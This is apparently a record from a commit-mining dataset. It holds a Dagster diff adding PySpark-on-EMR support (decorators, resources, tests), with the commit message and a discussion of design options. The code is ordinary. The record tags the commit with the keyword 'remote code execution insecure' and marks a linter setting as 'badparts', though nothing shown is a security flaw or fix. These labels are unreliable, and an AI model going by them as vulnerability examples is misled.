'spark_config': spark_config(),\n+        'job_flow_id': Field(str, description='Name of the job flow (cluster) on which to execute'),\n+        'region_name': Field(str),\n+        'action_on_failure': Field(str, is_optional=True, default_value='CANCEL_AND_WAIT'),\n+        'staging_bucket': Field(\n+            str,\n+            is_optional=False,\n+            description='S3 staging bucket to use for staging the produced main.py and zip file of'\n+            ' Python code',\n+        ),\n+        'requirements_file_path': Field(\n+            str,\n+            is_optional=True,\n+            description='Path to a requirements.txt file; the current directory is searched if none'\n+            ' is specified.',\n+        ),\n+    }\n+)\n+def emr_pyspark_resource(init_context):\n+    emr_pyspark = EMRPySparkResource(init_context.resource_config)\n+    try:\n+        yield emr_pyspark\n+    finally:\n+        emr_pyspark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\nnew file mode 100644\nindex 0000000000..b6267f9caf\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\n@@ -0,0 +1,63 @@\n+import copy\n+import os\n+import zipfile\n+\n+import six\n+\n+from dagster.utils import script_relative_path\n+\n+\n+def subset_environment_dict(environment_dict, solid_name):\n+    subset = copy.deepcopy(environment_dict)\n+    if 'solids' in subset:\n+        solid_config_keys = list(subset['solids'].keys())\n+        for key in solid_config_keys:\n+            if key != solid_name:\n+                del subset['solids'][key]\n+    return subset\n+\n+\n+def build_main_file(\n+    main_file, mode_name, pipeline_file, solid_name, environment_dict, pipeline_fn_name\n+):\n+    with open(script_relative_path('main.py.template'), 'rb') as f:\n+        main_template_str = six.ensure_str(f.read())\n+\n+    with open(main_file, 'wb') as f:\n+        f.write(\n+            six.ensure_binary(\n+                main_template_str.format(\n+                    mode_name=mode_name,\n+                    pipeline_file=os.path.splitext(os.path.basename(pipeline_file))[0],\n+                    solid_name=solid_name,\n+                    environment_dict=subset_environment_dict(environment_dict, solid_name),\n+                    pipeline_fn_name=pipeline_fn_name,\n+                )\n+            )\n+        )\n+\n+\n+def build_pyspark_zip(zip_file, path):\n+    '''Archives the current path into a file named `zip_file`\n+    '''\n+    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zf:\n+        for root, _, files in os.walk(path):\n+            for fname in files:\n+                abs_fname = os.path.join(root, fname)\n+\n+                # Skip various artifacts\n+                if 'pytest' in abs_fname or '__pycache__' in abs_fname or 'pyc' in abs_fname:\n+                    continue\n+\n+                zf.write(abs_fname, os.path.relpath(os.path.join(root, fname), path))\n+\n+\n+def get_install_requirements_step(python_dependencies, action_on_failure, python_binary='python3'):\n+    return {\n+        'Name': 'Install Dependencies',\n+        'ActionOnFailure': action_on_failure,\n+        'HadoopJarStep': {\n+            'Jar': 'command-runner.jar',\n+            'Args': ['sudo', python_binary, '-m', 'pip', 'install'] + python_dependencies,\n+        },\n+    }\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\nnew file mode 100644\nindex 0000000000..f53d93ce79\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\n@@ -0,0 +1,8 @@\n+boto3\n+dagster\n+dagit\n+dagster_aws\n+dagster_pyspark\n+dagster_spark\n+moto\n+pytest\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\nnew file mode 100644\nindex 0000000000..2505b1f5d0\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\n@@ -0,0 +1,116 @@\n+import os\n+\n+import boto3\n+import pytest\n+from dagster_aws.emr.resources import emr_pyspark_resource\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+from moto import mock_emr\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+from dagster.seven import mock\n+\n+\n+@pyspark_solid\n+def example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pyspark_solid(\n+    name='blah', description='this is a test', config={'foo': Field(str), 'bar': Field(int)}\n+)\n+def other_example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pipeline(\n+    mode_defs=[\n+        ModeDefinition('prod', resource_defs={'pyspark': emr_pyspark_resource}),\n+        ModeDefinition('local', resource_defs={'pyspark': pyspark_resource}),\n+    ]\n+)\n+def example_pipe():\n+    example_solid()\n+    other_example_solid()\n+\n+\n+def test_local():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},},\n+        run_config=RunConfig(mode='local'),\n+    )\n+    assert result.success\n+\n+\n+@mock_emr\n+@mock.patch('dagster_aws.emr.resources.EMRPySparkResource.wait_for_steps')\n+def test_pyspark_emr(mock_wait):\n+    client = boto3.client('emr', region_name='us-west-1')\n+\n+    run_job_flow_args = dict(\n+        Instances={\n+            'InstanceCount': 1,\n+            'KeepJobFlowAliveWhenNoSteps': True,\n+            'MasterInstanceType': 'c3.medium',\n+            'Placement': {'AvailabilityZone': 'us-west-1a'},\n+            'SlaveInstanceType': 'c3.xlarge',\n+        },\n+        JobFlowRole='EMR_EC2_DefaultRole',\n+        LogUri='s3:\/\/mybucket\/log',\n+        Name='cluster',\n+        ServiceRole='EMR_DefaultRole',\n+        VisibleToAllUsers=True,\n+    )\n+\n+    job_flow_id = client.run_job_flow(**run_job_flow_args)['JobFlowId']\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': job_flow_id,\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    )\n+    assert result.success\n+    assert mock_wait.called_once\n+\n+\n+@pytest.mark.skip\n+def test_do_it_live_emr():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': os.environ.get('AWS_EMR_JOB_FLOW_ID'),\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    )\n+    assert result.success\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\nnew file mode 100644\nindex 0000000000..f23691ea3a\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\n@@ -0,0 +1,23 @@\n+from dagster_aws.emr.utils import subset_environment_dict\n+\n+\n+def test_subset_environment_dict():\n+    environment_dict = {\n+        'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+        'resources': {\n+            'pyspark': {\n+                'config': {\n+                    'pipeline_file': 'dagster_aws_tests\/emr_tests\/test_pyspark.py',\n+                    'pipeline_fn_name': 'pipe',\n+                    'job_flow_id': 'j-272P42200OZ0Q',\n+                    'staging_bucket': 'dagster-scratch-80542c2',\n+                    'region_name': 'us-west-1',\n+                }\n+            }\n+        },\n+    }\n+    res = subset_environment_dict(environment_dict, 'blah')\n+    assert res == environment_dict\n+\n+    res = subset_environment_dict(environment_dict, 'not_here')\n+    assert res['solids'] == {}\ndiff --git a\/python_modules\/libraries\/dagster-aws\/setup.py b\/python_modules\/libraries\/dagster-aws\/setup.py\nindex acfa7dd513..892c7befed 100644\n--- a\/python_modules\/libraries\/dagster-aws\/setup.py\n+++ b\/python_modules\/libraries\/dagster-aws\/setup.py\n@@ -39,8 +39,8 @@ def _do_setup(name='dagster-aws'):\n         packages=find_packages(exclude=['test']),\n         include_package_data=True,\n         install_requires=['boto3==1.9.*', 'dagster', 'requests', 'terminaltables'],\n+        extras_require={'pyspark': ['dagster-pyspark']},\n         tests_require=['moto==1.3.*'],\n-        extras_require={':python_version<\"3\"': ['backports.tempfile']},\n         entry_points={'console_scripts': ['dagster-aws = dagster_aws.cli.cli:main']},\n         zip_safe=False,\n     )\ndiff --git a\/python_modules\/libraries\/dagster-aws\/tox.ini b\/python_modules\/libraries\/dagster-aws\/tox.ini\nindex f84b4bbfdf..bf5270ee64 100644\n--- a\/python_modules\/libraries\/dagster-aws\/tox.ini\n+++ b\/python_modules\/libraries\/dagster-aws\/tox.ini\n@@ -10,6 +10,8 @@ platform =\n deps =\n   -e ..\/..\/dagster\n   -r ..\/..\/dagster\/dev-requirements.txt\n+  -e ..\/dagster-spark\n+  -e ..\/dagster-pyspark\n   -r .\/dev-requirements.txt\n   -e .\n usedevelop = true\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\nindex 5f1367b451..94eef4bb83 100644\n--- a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n@@ -1,10 +1,7 @@\n import os\n \n-from dagster_spark.configs_spark import spark_config\n-from dagster_spark.utils import flatten_dict\n from pyspark.rdd import RDD\n from pyspark.sql import DataFrame as NativeSparkDataFrame\n-from pyspark.sql import SparkSession\n \n from dagster import (\n     Bool,\n@@ -22,6 +19,14 @@\n from dagster.core.types import Selector, input_selector_schema, output_selector_schema\n from dagster.core.types.runtime import define_any_type\n \n+from .decorators import pyspark_solid\n+from .resources import (\n+    PySparkResourceDefinition,\n+    pyspark_resource,\n+    spark_session_from_config,\n+    spark_session_resource,\n+)\n+\n \n @input_selector_schema(\n     Selector(\n@@ -78,25 +83,6 @@ def write_rdd(context, file_type, file_options, spark_rdd):\n )\n \n \n-def spark_session_from_config(spark_conf=None):\n-    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n-    builder = SparkSession.builder\n-    flat = flatten_dict(spark_conf)\n-    for key, value in flat:\n-        builder = builder.config(key, value)\n-\n-    return builder.getOrCreate()\n-\n-\n-@resource({'spark_conf': spark_config()})\n-def spark_session_resource(init_context):\n-    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n-    try:\n-        yield spark\n-    finally:\n-        spark.stop()\n-\n-\n @output_selector_schema(\n     Selector(\n         {\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\nnew file mode 100644\nindex 0000000000..ee8fd82c47\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\n@@ -0,0 +1,63 @@\n+from dagster import check, solid\n+\n+\n+def pyspark_solid(\n+    name=None,\n+    description=None,\n+    input_defs=None,\n+    output_defs=None,\n+    config=None,\n+    required_resource_keys=None,\n+    metadata=None,\n+    step_metadata_fn=None,\n+    pyspark_resource_key=None,\n+):\n+    # Permit the user to provide a named pyspark resource\n+    pyspark_resource_key = check.opt_str_param(\n+        pyspark_resource_key, 'pyspark_resource_key', default='pyspark'\n+    )\n+\n+    # Expect a pyspark resource\n+    required_resource_keys = check.opt_set_param(required_resource_keys, 'required_resource_keys')\n+    required_resource_keys.add(pyspark_resource_key)\n+\n+    # nonlocal keyword not available in Python 2\n+    non_local = {'name': name, 'required_resource_keys': required_resource_keys}\n+\n+    # Handle when we're called bare without arguments (e.g. name is actually the callable, not the\n+    # solid name)\n+    if callable(name):\n+\n+        @solid(name=name.__name__, required_resource_keys=required_resource_keys)\n+        def new_compute_fn(context):\n+            return context.resources.pyspark.get_compute_fn(fn=name, solid_name=name.__name__)(\n+                context\n+            )\n+\n+        return new_compute_fn\n+\n+    def wrap(fn):\n+        name = non_local['name'] or fn.__name__\n+\n+        @solid(\n+            name=name,\n+            description=description,\n+            input_defs=input_defs,\n+            output_defs=output_defs,\n+            config=config,\n+            required_resource_keys=non_local['required_resource_keys'],\n+            metadata=metadata,\n+            step_metadata_fn=step_metadata_fn,\n+        )\n+        def new_compute_fn(context):\n+            from .resources import PySparkResourceDefinition\n+\n+            spark = check.inst(\n+                getattr(context.resources, pyspark_resource_key), PySparkResourceDefinition\n+            )\n+\n+            return spark.get_compute_fn(fn, name)(context)\n+\n+        return new_compute_fn\n+\n+    return wrap\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\nnew file mode 100644\nindex 0000000000..fc3b956019\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\n@@ -0,0 +1,61 @@\n+import abc\n+\n+import six\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict\n+from pyspark.sql import SparkSession\n+\n+from dagster import check, resource\n+\n+\n+def spark_session_from_config(spark_conf=None):\n+    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n+    builder = SparkSession.builder\n+    flat = flatten_dict(spark_conf)\n+    for key, value in flat:\n+        builder = builder.config(key, value)\n+\n+    return builder.getOrCreate()\n+\n+\n+class PySparkResourceDefinition(six.with_metaclass(abc.ABCMeta)):\n+    def __init__(self, spark_conf):\n+        self._spark_session = spark_session_from_config(spark_conf)\n+\n+    @property\n+    def spark_session(self):\n+        return self._spark_session\n+\n+    @property\n+    def spark_context(self):\n+        return self.spark_session.sparkContext\n+\n+    def stop(self):\n+        self._spark_session.stop()\n+\n+    @abc.abstractmethod\n+    def get_compute_fn(self, fn, solid_name):\n+        pass\n+\n+\n+class SystemPySparkResource(PySparkResourceDefinition):\n+    def get_compute_fn(self, fn, solid_name):\n+        return fn\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def pyspark_resource(init_context):\n+    pyspark = SystemPySparkResource(init_context.resource_config['spark_conf'])\n+    try:\n+        yield pyspark\n+    finally:\n+        pyspark.stop()\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def spark_session_resource(init_context):\n+    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n+    try:\n+        yield spark\n+    finally:\n+        spark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py\nnew file mode 100644\nindex 0000000000..e69de29bb2\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\nnew file mode 100644\nindex 0000000000..8c8ba519b0\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\n@@ -0,0 +1,67 @@\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+\n+\n+def test_simple_pyspark_decorator():\n+    @pyspark_solid\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\n+\n+\n+def test_named_pyspark_decorator():\n+    @pyspark_solid(name='blah', description='foo bar', config={'foo': Field(str)})\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(\n+        pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'baz'}}}},\n+        run_config=RunConfig(mode='default'),\n+    ).success\n+\n+\n+def test_default_pyspark_decorator():\n+    @pyspark_solid(pyspark_resource_key='first_pyspark')\n+    def first_pyspark_job(context):\n+        list_p = [('Michelle', 19), ('Austin', 29), ('Lydia', 35)]\n+        rdd = context.resources.first_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pyspark_solid(pyspark_resource_key='last_pyspark')\n+    def last_pyspark_job(context):\n+        list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+        rdd = context.resources.last_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pipeline(\n+        mode_defs=[\n+            ModeDefinition(\n+                'default',\n+                resource_defs={'first_pyspark': pyspark_resource, 'last_pyspark': pyspark_resource},\n+            )\n+        ]\n+    )\n+    def pipe():\n+        first_pyspark_job()\n+        last_pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\ndiff --git a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\nindex 9562480ae1..f08e55ab8c 100644\n--- a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n+++ b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n@@ -17,7 +17,8 @@ def _flatten_dict(d, result, key_path=None):\n                 result.append(('.'.join(new_key_path), v))\n \n     result = []\n-    _flatten_dict(d, result)\n+    if d is not None:\n+        _flatten_dict(d, result)\n     return result\n \n \n@@ -28,6 +29,10 @@ def parse_spark_config(spark_conf):\n     '''\n \n     spark_conf_list = flatten_dict(spark_conf)\n+    return format_for_cli(spark_conf_list)\n+\n+\n+def format_for_cli(spark_conf_list):\n     return list(\n         itertools.chain.from_iterable([('--conf', '{}={}'.format(*c)) for c in spark_conf_list])\n     )\n","files":{"\/.pylintrc":{"changes":[{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]},{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]}],"source":"\n[MESSAGES CONTROL] disable=C,R,duplicate-code,W0511,W1201,W1202,no-init [TYPECHECK] ignored-classes=responses signature-mutators=solid,composite_solid,lambda_solid [MASTER] ignore=snapshots ","sourceWithComments":"[MESSAGES CONTROL]\n\n# Enable the message, report, category or checker with the given id(s). You can\n# either give multiple identifier separated by comma (,) or put this option\n# multiple time.\n#enable=\n\n# Disable the message, report, category or checker with the given id(s). You\n# can either give multiple identifier separated by comma (,) or put this option\n# multiple time (only on the command line, not in the configuration file where\n# it should appear only once).#\n#\n# R - refactoring related checks\n# C - convention related checks\n# W0511 disable TODO warning\n# W1201, W1202 disable log format warning. False positives (I think)\n\ndisable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n\n# See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n[TYPECHECK]\nignored-classes=responses\nsignature-mutators=solid,composite_solid,lambda_solid\n\n[MASTER]\nignore=snapshots"}},"msg":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349"}},"https:\/\/github.com\/merlinepedra25\/DAGSTER":{"1e02665ca7b2d58f178a499e0ab7b8056a4bab52":{"url":"https:\/\/api.github.com\/repos\/merlinepedra25\/DAGSTER\/commits\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","html_url":"https:\/\/github.com\/merlinepedra25\/DAGSTER\/commit\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","message":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349","sha":"1e02665ca7b2d58f178a499e0ab7b8056a4bab52","keyword":"remote code execution insecure","diff":"diff --git a\/.pylintrc b\/.pylintrc\nindex 5fb38167cd..b82f31e2cc 100644\n--- a\/.pylintrc\n+++ b\/.pylintrc\n@@ -20,7 +20,7 @@ disable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\nindex d03147cbed..9f8b39bc6d 100644\n--- a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n+++ b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n@@ -1,3 +1,5 @@\n recursive-include dagster_aws *.sh\n recursive-include dagster_aws *.yaml\n+recursive-include dagster_aws *.txt\n+recursive-include dagster_aws *.template\n include LICENSE\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\nnew file mode 100644\nindex 0000000000..81d5243677\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\n@@ -0,0 +1,21 @@\n+import sys\n+\n+from pyspark import SparkFiles\n+from pyspark.sql import SparkSession\n+\n+spark = 